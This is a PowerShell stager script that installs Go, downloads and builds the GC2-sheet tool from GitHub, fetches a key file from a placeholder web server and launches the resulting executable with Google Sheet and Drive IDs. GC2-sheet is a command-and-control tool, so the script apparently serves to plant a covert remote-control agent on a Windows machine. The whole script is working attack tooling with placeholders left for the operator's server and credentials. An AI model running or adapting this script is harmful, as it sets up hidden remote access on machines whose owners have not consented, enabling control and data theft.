<#
A PowerShell script that downloads Go, adds it to the user's PATH, downloads the zip from the repository "looCiprian/GC2-sheet",
builds the executable, and runs gc2-sheet. Note: requires a web server to host the #MY_KEY_JSON file to Invoke-WebRequest down,
#MY_SHEET_ID, and #MY_DRIVE_ID to be incorporated into the PS1. Recommend using Invoke-RestMethod or Invoke-WebRequest to pull down
the contents of the file.
#>

# Define variables
$myUrl = "#MY_TARGET_URL"
$myKey = "#MY_KEY_JSON"
$mySheetId = "#MY_SHEET_ID"
$myDriveId = "#MY_DRIVE_ID"

# Change to the Downloads directory
cd $env:userprofile\Downloads

# Download and extract Go
Invoke-WebRequest -Uri "https://go.dev/dl/go1.21.12.windows-amd64.zip" -OutFile "go.zip"
Expand-Archive .\go.zip
mv .\go $env:userprofile
Remove-Item -Path "go.zip" -Force

# Add Go to the PATH
$env:PATH += ";$env:userprofile\go\go\bin"

# Download and extract the GC2-sheet repository
Invoke-WebRequest -Uri "https://github.com/looCiprian/GC2-sheet/archive/refs/heads/master.zip" -OutFile "master.zip"
Expand-Archive .\master.zip
Remove-Item -Path "master.zip" -Force

# Change to the GC2-sheet directory
cd "$env:userprofile\Downloads\master\GC2-sheet-master"

# Download the key file
Invoke-WebRequest -Uri "http://$myUrl/$myKey" -UseBasicParsing -OutFile "$myKey"

# Build the gc2-sheet executable
go build gc2-sheet.go

# Run the gc2-sheet executable with the specified parameters
.\gc2-sheet -k $myKey -s $mySheetId -d $myDriveId

